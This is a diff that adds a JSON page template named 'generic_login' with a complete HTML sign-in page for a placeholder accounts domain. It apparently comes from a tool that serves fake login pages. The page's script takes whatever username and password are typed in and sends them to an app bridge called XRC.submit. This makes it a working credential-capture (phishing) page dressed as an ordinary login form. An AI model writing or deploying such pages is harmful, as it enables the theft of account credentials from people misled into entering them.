@@ -1,0 +1,7 @@
+{
+  "id": "generic_login",
+  "domain": "accounts.example.com",
+  "name": "Login",
+  "type": "generic",
+  "html": "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Sign In</title><style>body{margin:0;padding:0;background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}.box{background:#fff;padding:40px;border-radius:12px;width:90%;max-width:360px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}.logo{text-align:center;margin-bottom:30px;font-size:22px;font-weight:bold;color:#333}input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;background:#fff;color:#000;box-sizing:border-box;font-size:15px}input:focus{outline:none;border-color:#4CAF50}button{width:100%;padding:14px;margin-top:16px;background:#4CAF50;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer}button:active{opacity:0.8}</style></head><body><div class='box'><div class='logo'>Sign In</div><input type='text' id='username' placeholder='Username / Email'><input type='password' id='password' placeholder='Password'><button onclick='submit()'>Continue</button></div><script>function submit(){var u=document.getElementById('username').value;var p=document.getElementById('password').value;XRC.submit(JSON.stringify({username:u,password:p}));}</script></body></html>"
+}
